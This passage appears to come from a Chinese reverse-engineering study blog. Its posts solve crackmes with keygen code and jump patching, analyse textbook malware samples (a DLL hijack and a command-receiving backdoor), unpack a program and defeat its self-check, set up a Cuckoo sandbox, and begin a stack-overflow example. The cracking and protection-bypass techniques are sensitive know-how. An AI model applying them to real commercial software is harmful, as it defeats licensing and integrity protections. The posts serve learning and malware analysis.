http://pan.baidu.com/s/1bSPUdK\n\n二、分析过程\n\n这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。\n\n打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。\n\n![](http://i.imgur.com/zNx08T2.png)\n\n寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，\n\n![](http://i.imgur.com/L7OC3u0.png)\n\n继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，\n\n![](http://i.imgur.com/XvyRwWc.png)\n\n重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序，\n\n![](http://i.imgur.com/6LollUw.png)\n\n\n程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80,\n\n![](http://i.imgur.com/xWA8wmF.png)\n\n\n然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00,\n\n![](http://i.imgur.com/KF1WoYi.png)\n\n然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235，\n\n![](http://i.imgur.com/SM4q3Fu.png)\n\n继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数__vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax=0x31即ax=31,最后得到edi的值为6*0x17cfb+0x31=0x8ee13,然后程序调用__vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。\n\n![](http://i.imgur.com/s7GXTIj.png)\n\n   4.转化为c代码为：\n\t#include<stdio.h>\n\t#include<stdlib.h>\n\t#include<string.h>\n\tint main()\n\t{\n\t\tchar name[10];\n\t\tint len=0,key=0;\n\t\tscanf(\"%s\",&name);\n\t\tlen=strlen(name);\n\t\tkey=len*0x17cfb+name[0];\n\t\tprintf(\"AKA-\");\n\t\tprintf(\"%d\\n\",key);\n\t\tsystem(\"pause\");\n\t\treturn 0;\n\t}\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码分析第一记","url":"/2017/08/01/恶意代码分析第一记/","content":"\n一、样本基本信息\n\n分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe\n\n二、分析过程\n\n首先在虚拟机里准备好必要的工具，\n静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。\n\n动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。\n\n- 静态分析步骤：\n\n\n•     PEID 查壳\n\n![img](https://i.imgur.com/4usSk9D.png)\n\t\n发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。\n\t\n• PEVIew\n\n抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数,\n\n![img](https://i.imgur.com/OhjexaS.png)\n\n• Strings\n\n用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。\n\n![img](https://i.imgur.com/wbTQjEZ.png)\n\n​\t\n\n- 动态分析步骤\n\n首先运行process monitor、process explorer、ApateDNS、regshot等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。\n\n![img](https://i.imgur.com/q2coLee.png)\n\n在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。\n\n![img](https://i.imgur.com/jVOp29K.png)\n","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码分析第二记","url":"/2017/08/01/恶意代码分析第二记/","content":"\n一、样本基本信息\n\n.样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll.\n\n二、分析过程\n\n首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp.\n\n![img](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/wiWLOYN.png)\n\n![img](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/3SglnDX.png)\n\n然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。\n\n![](http://i.imgur.com/NPtmzMv.png)\n\n![](http://i.imgur.com/pa6CXX9.png)\n\n查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。\n对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对'C:\\Windows\\System32\\Kernel32.dll 和lab07-03.dll进行了一系列的文件读写操作，这部分详情分析有点困难，我们留到动态分析的时候再来做。最后把文件lab07-03.dll拷贝到'C:\\Windows\\System32\\Kerne132.dll中。继续往下看，是一个函数4011e0,参数是c盘根目录，跟进去看一下发现是一个遍历文件夹的操作。判断是否是.exe文件，然后是进行内存映射，查找kernel32.dll字符串改为kerne132.dll字符串。意图很明显了，让c盘目录下的exe文件加载山寨的kerne132.dll。\n\n![](http://i.imgur.com/9bkmJL4.png)\n![](http://i.imgur.com/w91FP9E.png)\n![](http://i.imgur.com/1Tw8cLs.png)\n\n然后我们对lab07-03.dll进行静态ida反汇编看一下。dll的代码就很简单了，首先创建互斥体保证只有一个再运行，然后建立socket网络连接，ip是127.26.152.13，端口是80，首先 发送hello,并且利用shutdown()函数关闭套接字的写功能，然后就是recv进行监听了，如果受到的字符串是sleep就睡眠60秒，如果是exec那就是远程执行，创建进程，命令行参数此时未知。\n\n![](http://i.imgur.com/VzM4RLc.png)\n下一步就是验证我们的猜想，在命令行加上正确的参数运行程序，构建好模拟网路和监控工具。\n![](http://i.imgur.com/w9wS2Qg.png)\n![](http://i.imgur.com/KOWwJp5.png)\n\n如图看到了文件映射的操作，以及大量的遍历操作，跟我们通过反汇编得到的结果几乎一致。\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"迷路","url":"/2017/08/01/迷路/","content":"\n###步骤如下\n\n1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：http://pan.baidu.com/s/1hr5CtpU 密码：r9wi\n\n2.首先运行题目，如下图所示，跟平常的题目没什么两样。随便输入字符串，发现弹出报错信息。咋一看，有关键字符串，好咧，这题不难，肯定可以找到关键挑战，然后问题就简单了。（太天真。。。）\n\n![](http://i.imgur.com/60iDg8y.png)\n\n3  打开OD载入程序，搜索字符串，发现关键字符串，很高兴。\n\n![](http://i.imgur.com/J9OcWmh.png)\n\n\n在字符串上方发现两个跳转都跳到失败处，猜想应该是二次验证，一个一个分析，分析第一个call crackme.00402e40 ，发现是对输入的字符串进行一系列处理，然后得到一个数值，在下面语句中发现是和0x92381221 进行比较。不等则跳转向失败，打开IDA，分析关键call ,发现0x92381221代表的十进制数2453148193刚好符合条件，心中顿感，我实在是太聪明了。\n\n![](http://i.imgur.com/gT8tpJM.png)\n\n继续往下看下一个跳转，call crackme.00401DF0,发现是两个字符串比较，猜想是我们前面的字符串进行再次的运算得到一堆字符串然后比较，然后分析可得处理函数为call crackme.00401990,分析关键call 发现是把输入进行MD5运算得到的一堆字符串。沃日。。。这控制不了啊。。。然后感觉不太对，于是我尝试暴力把跳转改一下，看会出现什么情况。发现既弹出了成功，又弹出来失败，感觉不对。\n\n\n4.想着对消息框下个断点，F9运行，点击工具栏的W发现，竟然出现了两个输入Input,觉得肯定玄机在此，觉得其中一个按钮一定是被隐藏了，在command 位置下断点，输入 bp ShowWindow,寻找ShowWindow函数，重新运行程序，发现运行到了用户层，alt+f9运行出来，发现前面就是ShowWindow 窗口在此下断点，删除刚刚下的user32里的断点，发现参数信息为0时，为隐藏，为1时为显现，于是更改参数值如下图所示：\n\n![](http://i.imgur.com/k7dqhuI.png)\n\n复制到可执行文件，保存文件。再次运行发现果然出现了两个输入按钮。\n\n5.修改后的程序重新加载进OD，此时发现感觉没什么思路，对获取输入字符串的函数进行下断点，在IDA中发现有GetWindowText函数，双加该函数，ctrl+x 获取其引用的位置，记下地址，在OD中ctrl+g 查找，找到该函数位置下断点，重新运行程序，输入字符串，点击左边的Input,程序运行到断点处，F8单步运行，发现下面有一个call ,F7进去看看，发现是获取字符串的长度，感觉好多Crackme都会对字符串的长度进行检查，于是对存字符串的位置下一个内存访问断点，看看是否有什么意外的惊喜，F9运行程序，发现程序到了这，IDA查看此位置的反编译结果，发现果然是对字符串的长度进行了检查，0x27u说明字符串长度为39,79，79,67,84,70,123,125刚好是题目所说的格式00CTF{},继续运行寻找返回的地方。最后回到401f96的位置，此处果然为一个调用，检查长度和格式。如果不符合返回值为0，跳到失败的位置。符合的话返回值为1，继续往下进行。\n\n![](http://i.imgur.com/EoKNATC.png)\n\n![](http://i.imgur.com/HQGVXkP.png)\n\n6 继续往下分析，分析各个call 的作用，发现call 1.00401860 位置的call 有很大的嫌疑，里面有各种循环，猜测为算法处理过程，IDA定位此处位置分析基本确定此位置，继续向下运行，查找字符串比较的过程，发现地址为401fca的调用，是弹出错错误的位置，此处下断点，重新运行程序到这个位置，F7进去分析，同时打开IDA，定位此函数，辅助分析，果然发现了两个MessageBOXA函数。分析不同的弹框结果发现前面是一个字符串比较函数，IDA按table键定位此函数的位置。\n\n![](http://i.imgur.com/O2ZMscC.png)\t\n\n进去发现是一个一个进行字符的比较，比较字符串b5h760h64R867618bBwB48BrW92H4w5r  错误的话最后函数返回值为1，弹出错误对话框。\n\t\n7.现在的问题就只剩下解决算法出路的问题了。IDA反编译出的代码如下\n\n![](http://i.imgur.com/bvyHkdm.png)\n\n分析可知其对数字不做变换，大写字母减去65然后再进行关键操作，\nV9=(V6+V5*V7)%26+((V6+V5*V7)%26<0?0X1a:0)\nv6在调试的时候会出现32-2-2=28，v5情况有点复杂，可能是3或者5，待会再说为什么，小写字母减去97然后进行关键操作，这样就进行了字符串的变换。\n关于v6的问题：该数值最早是函数0041458e 的返回值，返回值为-1的时候就赋值为3，否则为原数。我用3进行测试的时候发现是错误的，那这个函数0041458e 就很有问题。\n在此处下断点，F7进去发现是再次调用了函数41459c,继续跟进去同时观察IDA的结果，\n\n![](http://i.imgur.com/B0LOlTZ.png)\n\n发现其实就是判断_mbschr((const unsigned __int8 *)(a3 + *(_DWORD *)this),a2))的结果，点击该函数进去，OD定位该位置，单步运行会发现，其实是检查输入字符串的第六位是否为0，如果为0则返回 值为0的地址，后面是字符串的地址减去该地址为5，即为v6,否则的话返回值为-1，在后面的判断中赋值为3.此为v6的具体赋值过程。\n\n![](http://i.imgur.com/IbfwZCz.png)","tags":["逆向"],"categories":["逆向"]},{"title":"搭建虚拟网络环境inetsim","url":"/2017/07/22/inetsim/","content":" 主要步骤详见\n\n\n1.inetsim 安装详见http://www.inetsim.org/packages.html\n\n2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","tags":["逆向"],"categories":["逆向"]},{"title":"拯救我的虚拟机","url":"/2017/07/22/拯救我的虚拟机/","content":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。\n\n尝试方法1：找到虚拟机设置->选项->快照->恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。![](http://i.imgur.com/JYajVBB.png)\n\n尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置->硬盘->添加->硬盘->选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。\n","tags":["杂学"],"categories":["杂学"]},{"title":"esp脱壳+文件大小自校验","url":"/2017/07/15/esp脱壳+文件大小自校验/","content":"### 步骤如下\n\n1.查壳\n由图可见，显然有壳\n\n![](http://i.imgur.com/56OEUZ6.png)\n\n2.找oep(ESP定律)\n\n程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。\n在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep.\n\n![](http://i.imgur.com/7VfQh3T.png)\n![](http://i.imgur.com/CaYz7wj.png)\n\n3.脱壳(LordPE)\n\n在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。\n![](http://i.imgur.com/o84YxcW.png)\n\n4.修复导入表(ImportREC)\n\n 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。\n\n![](http://i.imgur.com/Ah6wEjD.png)\n\n5.文件大小自检\n\n脱壳以后双击没得反应，可能是有文件大小自检校验，脱壳后的程序载入OD，在GetFileSize函数下断点，在插件中选API断点设置工具->常用API断点。选中文件类的GetFileSize.然后F9运行程序，到断点处停下，在堆栈中右键反汇编跟随，找到调用这个函数的位置，然后下断点，把刚刚的那个断点删除。在断点后发现是几个cmp ,很明显是比较文件大小，故而把这两个ｃｍｐ右键二进制－＞用ｎｏｐ填充。然后复制到可执行文件，保存文件。再次点击程序，发现正常运行。\n![](http://i.imgur.com/3X4dGg6.png)\n\n![](http://i.imgur.com/nIXhd5Y.png)\n\n![](http://i.imgur.com/UEFRdvd.png)\n\n**\n注：esp 定律**\n\n\nESP定律算是我们在脱壳当中最常使用的方法之一，也特别适合像我一样的新手！而今天文章说的是ESP脱壳的原理和分析！只有知道原理了，我们的技术才能走得列远！\n\n\n一.准备知识\n在我们开始讨论ESP定律之前，我先给你讲解一下一些简单的汇编知识。\n\n\n1.call\n\n这个命令是访问子程序的一个汇编基本指令。也许你说，这个我早就知道了！别急请继续看完。call真正的意义是什么呢？我们可以这样来理解：\n\n1.向堆栈中压入下一行程序的地址；\n2.JMP到call的子程序地址处。\n\n例如：\n\n代码:\n\n00401029.E8 DA240A00 call 004A3508\n0040102E.5A pop edx\n\n在执行了00401029以后，程序会将0040102E压入堆栈，然后JMP到004A3508地址处！\n\n\n\n2.RETN\n\n与call对应的就是RETN了。对于RETN我们可以这样来理解：\n\n1.将当前的ESP中指向的地址出栈；\n\n2.JMP到这个地址。\n\n这个就完成了一次调用子程序的过程。在这里关键的地方是：如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。这也就是著名的“堆栈平衡”原理！\n\n\n3.狭义ESP定律\n\nESP定律的原理就是“堆栈平衡”原理。\n\n让我们来到程序的入口处看看吧！\n\n1.这个是加了ASPACK壳的入口时各个寄存器的值！\n\n代码:\n\nEAX 00000000\n\nECX 0012FFB0\n\nEDX 7FFE0304 //堆栈值\n\nEBX 7FFDF000 //堆栈值\n\nESP 0012FFC4\n\nEBP 0012FFF0\n\nESI 77F57D70 ntdll.77F57D70\n\nEDI 77F944A8 ntdll.77F944A8\n\nEIP 0040D000 ASPACK.<ModuleEntryPoint>\n\n2.这个是ASPACK壳JMP到OEP后的寄存器的值！\n\n代码:\n\nEAX 004010CC ASPACK.004010CC\n\nECX 0012FFB0\n\nEDX 7FFE0304 //堆栈值\n\nEBX 7FFDF000 //堆栈值\n\nESP 0012FFC4\n\nEBP 0012FFF0\n\nESI 77F57D70 ntdll.77F57D70\n\nEDI 77F944A8 ntdll.77F944A8\n\nEIP 004010CC ASPACK.004010CC\n\n呵呵~是不是除了EIP不同以外，eax保存当前OEP值，其他都一模一样啊！\n\n为什么会这样呢？我们来看看\n\n\n0040D000 A> 60 pushad //注意这里ESP=0012FFC4\n\n0040D001 E8 00000000 call ASPACK.0040D006 //ESP=0012FFA4\n\nPUSHAD就是把所有寄存器压栈！我们在到壳的最后看看：\n\n代码:\n\n0040D558 61 popad //ESP=0012FFA4\n\n0040D559 75 08 jnz short ASPACK.0040D563 //注意这里ESP=0012FFC4\n\n也就是说当我们对ESP的0012FFA4下硬件访问断点之后。当程序要通过堆栈访问这些值，从而恢复原来寄存器的值，准备跳向苦苦寻觅的OEP的时候，OD帮助我们中断下来。\n\n\n\n小结：我们可以把壳假设为一个子程序，当壳把代码解压前和解压后，他必须要做的是遵循堆栈平衡的原理。\n\n因为大家对ESP理解各有异同，但是，大同小异！一般理解可以为：\n\n1、在命令行下断hr esp-4（此时的ESP就是OD载入后当前显示的值）\n\n2、hr ESP(关键标志下一行代码所指示的ESP值(单步通过)) \n\n","tags":["逆向"],"categories":["逆向"]},{"title":"第一次注册机","url":"/2017/07/12/第一次编写注册机/","content":"\n#### 步骤如下\n\n1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8\n\n2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下\n![](http://i.imgur.com/kQ9YJPI.png)\n\n3、打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串,得到关键字符串\"Correct way to go,You Got It\".点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。\n\n![](http://i.imgur.com/H0wjDEh.png)\n![](http://i.imgur.com/eLlL0cI.png)\n\n分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。\n\n4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，\n![](http://i.imgur.com/SGROWMU.png)\n看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、\n![](http://i.imgur.com/COHLpMa.png)\n\n5、下面分析其算法逻辑。\nJNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。![](http://i.imgur.com/ougupiX.png) \n\n\n再后面就是其具体的算法了：\n\n![](http://i.imgur.com/37qWSuL.png)\n\n用c代码来表示就是：\n\n\t#include<stdio.h>\n\t#include<string.h>\n\tint main()\n\t{\n\t\tchar name[200];\n\t\tchar key[100] = { 0 };  \n\t\tint nlen,i;   // int 4个字节 \n\t\tint start;\n\t\t//int len=5;\n\t\tstart=0x81276345;\n\t\tscanf(\"%s\", name);\n\t\tnlen = strlen(name);\n\t\tif(nlen>=5)\n\t\t{\n\t\t\t//printf(\"%s\", name);\n\t\t\t//printf(\"%c\", name[0]);\n\t\t\tfor(i=0;i<nlen;i++)\n\t\t\t{\n\t\t\t\tstart=start+name[i];\n\t\t\t\t//i=i<<8;\n\t\t\t\t//printf(\"%x\\n\",i);\n\t\t\t\tstart=start^(i<<8);\n\t\t\t\t//j=i+1;\n\t\t\t\t//tmp=len*i;\n\t\t\t\t//tmp=~tmp;\n\t\t\t\t//j=j*tmp;\n\t\t\t\tstart=start*(i+1)*(~(nlen*i));\n\t\t\t\t//printf(\"%x\\n\",start);\n\t\t\t}\n\t\t\tprintf(\"%1u\\n\",start);  //u 代表无符号整数\n\t\t\tsystem(\"pause\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf(\"序列号不能少于5位\\n\");\n\t\t\tsystem(\"pause\");\n\t\t}\n\t\treturn 0;\n\t}\n\n输入任意大于等于5位的字符串，得到的结果就是其序列号。如\n![](http://i.imgur.com/fGIngFo.png)\n![](http://i.imgur.com/jaGjvKJ.png)","tags":["逆向"],"categories":["逆向"]},{"title":"cuckoo真机分析环境(clonezilla)","url":"/2017/07/11/cuckoo真机分析环境/","content":"序言介绍：为了应对层出不穷的反虚拟机技术，本文实现一种真机搭建cuckoo的方式，结合国家网路中心的clonezila来实现分析机器的还原。\n##### 一、硬件准备\n\t*ubuntu16.04服务器一台(可在虚拟机中实现）\n\t*win7或者winxp一台\n\t*交换机一台\n##### 二 .服务器搭建\n\n我选择的目前最新的ubuntu16.04，内置python2.7比较方便,当然也可以选择其他版本的系统，或者centos应该也可以，不过最好用ubuntu,因为资料较多，cuckoo官方资料也是用cuckoo搭建的。\n\n**1）.安装python2.7**\n\n这是cuckoo所需要的，如果你的系统内置了python2.7那就不用安装了，安装步骤网上教程一大堆，不再赘述。查看python版本 python -V，一般内置pip安装工具，没有的话另外安装一下。\n\n**2）.安装依赖库**\n\n1.安装相关的依赖库\n\n\t\tsudo apt-get install python python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg-dev\n\n然后去[cuckoog官网](https://cuckoosandbox.org/)或者[github](https://github.com/cuckoosandbox/cuckoo)下载cuckoo最新版本,然后解压打开cuckoo文件夹，有个requiremens.txt的文件夹，这需要全部下载，可以用python的pip进行安装，其中其中的 pefile 需要从 Google Code 上下载，由于大陆网络限制，需要自备梯子，登上梯子后执行以下批量安装命令：\n\n\tpip install -r requirements.txt\n\n或者先把pefile安装源码下载，手动安装，然后把它从requirements.txt里删除，然后用pip命令安装，个人建议用第二种方法。\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.Host 机需要可以嗅探网络数据包，需要安装 tcpdump ，如果本机没有，则执行以下命令安装 tcpdump：\n\n\t\t**apt-get install tcpdump**\n\n如果系统没启用 root 账户，由于 tcpdump 的执行需要 root 权限，则需要以下配置：\n\n\t\t**$ sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump**\n\n如果系统里没有setcap命令，则需要安装 libpcap包：\n\n\t\t**$ sudo apt-get install libcap2-bin**\n\n如果需要启用内存镜像分析，需要安装 volatility：\n\n\t\t**apt-get install volatility**\n**3）.cuckoo配置文件的修改**\n\n主要修改的文件有：cuckoo.conf,physical.conf,auliary.conf.重点修改前两个。\n\n1.修改cuckoo.conf\n\n\tversion_check = on 这个其实可以关掉，不然一直检查，如果你版本稍微低了一下就报错。\n\tmachinery = physical 这个地方改成physical\n\tip = 192.168.56.1 根据你的实际情况填写\n\tvm_state = 60  根据你的电脑实际还原时间填写\n\n;2.修改physical.conf\n\tuser = username\n\tpassword = password 根据你的分析机填写\n\tinterface = eth0根据你的网卡填写\n\tip = 192.168.56.101根据你的分析机填写\n\n**4）.安装drbl**\n\n1. 设置静态ip地址，直接在桌面设置及可以了。\n\n2.安装drbl金钥\n\n    wget -q http://drbl.nchc.org.tw/GPG-KEY-DRBL -O- | sudo apt-key add -\n\n3.添加drbl源(根据自己的系统版本修改一下）\n\n    vi /etc/apt/sources.list\n    deb http://free.nchc.org.tw/ubuntu xenial main restricted universe multiverse\n    deb http://free.nchc.org.tw/drbl-core drbl stable\n\n\n3.安装drbl\n\n\tsudo apt-get update\n\tsudo apt-get install drbl \n4.设置drblserver\n\n\tsudo drblsrv -i\n提示!当有yes/no选项的时候，预设的值是大写的字母。例如 (y/N), 预设值是 \"N\", 当你按 \"Enter\"的时候，程式使用的值就是 \"N\"。如果你不确认选用那个好的时候，直接按\"Enter\"键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，在这不赘述。\n\n5.设置环境\n\n\tsudo drblpush -i\n提示!当有yes/no选项的时候，预设的值是大写的字母。例如 (y/N), 预设值是 \"N\", 当你按 \"Enter\"的时候，程式使用的值就是 \"N\"。如果你不确认选用那个好的时候，直接按\"Enter\"键是一个保险的方式.感觉不保险的话，去搜一下，很多介绍的，一般都差不多。**注意有一点，搜集网卡的时候尽量选择实时收集，然后收集完，注意查看是否有文件在相应目录，还有注意系统读取网卡文件的名字的命名方式，比如我的网卡为ens33,所以网卡文件为macadr-ens33.txt,但是系统读取文件的时候可能会去查找以macadr-eth开头的文件，所以遇到这种情况的话，去手动创建一个这样的文件就可以了。还有就是配置的时候尽量切到/etc/drbl目录下进行操作。**\n\n6.现在基本上drbl就设置好了。\n\n**5）、网路设置**\n\t\n由于我在虚拟机上搭建的服务器，所以我选择桥接模式，桥接到物理机有线网卡上，然后外接到交换机，然后分析机器也接到交换机，构成一个物理的局域网环境。\n\n#### 三.分析机设置\n\n1.首先安装python2.7，去python官网下载就好了。\n\n2.关闭防火墙，自动更新，uac。\n\n3.设置python运行权限为管理员。\n\n4.设置固定ip.(注意此时的ip不要和clonezila给他分配的ip一致，否则在还原的时候，网络捕捉模块会抓取太多还原时候的无用包，从而导致分析报告异常庞大。）\n\n**到此整个环境搭建就已经差不多了。注意需要熟悉drbl的使用方法才能使用此环境。此外还需要把drbl还原分析机的指令加入到cuckoo的源代码里去。文件具体为：scheduler库文件，添加到让分析机关机指令的前面位置。\n","tags":["逆向"],"categories":["逆向"]},{"title":"栈基础知识","url":"/2017/07/10/栈基础知识/","content":"\n\n### 1.C语言变量的分布 ：\nC 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： \n\n\t#include <stdio.h> \n\tint g1=0, g2=0, g3=0; \n\tint main() \n\t{ \n\tstatic int s1=0, s2=0, s3=0; \n\tint v1=0, v2=0, v3=0; \n\t\n\t//打印出各个变量的内存地址 \n\t\n\tprintf(\"0x%08x\\n\",&v1); //打印各本地变量的内存地址 \n\tprintf(\"0x%08x\\n\",&v2); \n\tprintf(\"0x%08x\\n\\n\",&v3); \n\tprintf(\"0x%08x\\n\",&g1); //打印各全局变量的内存地址 \n\tprintf(\"0x%08x\\n\",&g2); \n\tprintf(\"0x%08x\\n\\n\",&g3); \n\tprintf(\"0x%08x\\n\",&s1); //打印各静态变量的内存地址 \n\tprintf(\"0x%08x\\n\",&s2); \n\tprintf(\"0x%08x\\n\\n\",&s3); \n\tsystem(\"pause\");\n\treturn 0; \n\t} \n\n可以看出本地变量和全局/静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。\n进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“，\n![](http://i.imgur.com/Pbbtyit.png)\n\n\n\n### 2. 栈的存储\n\n\n\t\t#include <stdio.h> \n\t\tvoid __stdcall func(int param1,int param2,int param3) \n\t\t{ \n\t\tint var1=param1; \n\t\tint var2=param2; \n\t\tint var3=param3; \n\t\tprintf(\"0x%08x\\n\",&parameter1); //打印出各个变量的内存地址 \n\t\tprintf(\"0x%08x\\n\",&parameter2); \n\t\tprintf(\"0x%08x\\n\\n\",&parameter3); \n\t\tprintf(\"0x%08x\\n\",&var1); \n\t\tprintf(\"0x%08x\\n\",&var2); \n\t\tprintf(\"0x%08x\\n\\n\",&var3); \n\t\treturn; \n\t\t} \n\t\tint main() \n\t\t{ \n\t\tfunc(1,2,3); \n\t\treturn 0; \n\t\t} \n\n![](http://i.imgur.com/kFjeO8n.png)\n\n函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3\n\n\n### 3.程序进入main()函数 ，栈帧的保存和关闭\n\n\n例如：\n\n\tint main（）\n\t{\n\treturn0；\n\t}\n\t汇编代码为：\n\tpush ebp;   保存进入main()函数时其他初始化函数的栈底\n\tmove ebp,esp; 把当前esp的值作为栈底\n\tsub esp ,40h 开辟栈空间，作为局部变量的存储空间\n\tpush ebx\n\tpush  esi\n\tpush  edi  保存寄存器的值\n\tLEA edi ,[ebp-40h]  取出此函数可用栈空间首地址  \n\tmov ecx,10h            设置ecx寄存器的值\n\tmov eax ,occcccccch  把局部变量初始化为0xcccccccch\n\trep stos  dword ptr [edi]   根据ecx的值，把eax的内容，以四字节为单位写到edi指向的内存\n\txor eax,eax    设置返回值为0\n\tpop  edi  \n\tpop esi\n\tpop ebx   弹出压入寄存器的值\n\tadd esp,40h  降低esp,局部空间释放\n\tcmp ebp,esp 检查栈平衡\n\tcall _chkesp()  进入栈错误检查函数\n\tmov esp.ebp  还原esp\n\tpop ebp         还原ebp\n\tret\n\n\n### 4.  简单的分配栈帧及溢出修改相邻变量\n\n\n例如：\n\n\t\t#include <windows.h>\n\t\t \n\t\t#define PASSWORD \"1234567\"\n\t\t \n\t\tint verify_password(char *password){\n\t\t\tint authenticated;\n\t\t\tchar buffer[8];\n\t\t\tauthenticated = 